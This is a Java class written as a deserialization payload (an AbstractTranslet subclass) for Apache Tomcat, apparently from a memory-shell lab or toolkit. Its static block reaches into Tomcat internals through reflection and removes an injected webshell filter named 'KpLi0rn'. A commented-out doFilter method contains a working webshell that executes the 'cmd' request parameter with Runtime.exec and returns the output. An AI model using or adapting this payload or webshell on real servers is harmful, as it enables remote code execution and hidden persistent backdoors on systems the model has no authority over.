package com.example.demo.Static;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.security.SecurityUtil;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class TomcatInjectKill extends AbstractTranslet {
    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filter_Name = "KpLi0rn";

    static {
        try {
            ServletContext servletContext = getServletContext();
            if (servletContext != null){
                Field ctx = servletContext.getClass().getDeclaredField("context");
                ctx.setAccessible(true);
                ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);

                Field stdctx = appctx.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(appctx);

                if (standardContext != null){
                    // 这样设置不会抛出报错
                    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                    Configs.setAccessible(true);
                    Map filterConfigs = (Map) Configs.get(standardContext);
                    Map<String, ApplicationFilterConfig> filterConfigMap = (Map<String, ApplicationFilterConfig>)filterConfigs;

                    for(Map.Entry<String, ApplicationFilterConfig> map : filterConfigMap.entrySet()){
                        String filterName = map.getKey();
                        ApplicationFilterConfig filterConfig = map.getValue();
                        // 反射获取 getFilter() 方法。反射可以让你绕过访问控制来调用私有方法。
                        Method getFilterMethod = ApplicationFilterConfig.class.getDeclaredMethod("getFilter");
                        // 设置方法可访问
                        getFilterMethod.setAccessible(true);
                        // 调用 getFilter() 方法
                        Object filterObject = getFilterMethod.invoke(filterConfig);
                        //Filter filterObject = filterConfig.getFilter();
                        // 如果是内存马的filter名
                        if(filterName.startsWith(filter_Name)){
                            SecurityUtil.remove(filterObject);
                            filterConfigMap.remove(filterName);
                        }
                    }
                }

            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        /*shell注入，前提需要能拿到request、response等*/
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
        //不为空则意味着第一次反序列化的准备工作已成功
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        //如果不能去到request，则换一种方式尝试获取

        //spring获取法1
        if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (ServletRequest) m.invoke(o);
            } catch (Throwable t) {}
        }
        if (servletRequest != null)
            return servletRequest.getServletContext();

        //spring获取法2
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            ServletContext servletContext = (ServletContext) m.invoke(o);
            return servletContext;
        } catch (Throwable t) {}
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

//    @Override
//    public void init(FilterConfig filterConfig) throws ServletException {
//
//    }
//
//    @Override
//    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
//                         FilterChain filterChain) throws IOException, ServletException {
//        System.out.println(
//                "TomcatShellInject doFilter.....................................................................");
//        String cmd;
//        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
//            Process process = Runtime.getRuntime().exec(cmd);
//            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
//                    new java.io.InputStreamReader(process.getInputStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = bufferedReader.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;
//        }
//        filterChain.doFilter(servletRequest, servletResponse);
//    }
//
//    @Override
//    public void destroy() {
//
//    }
}
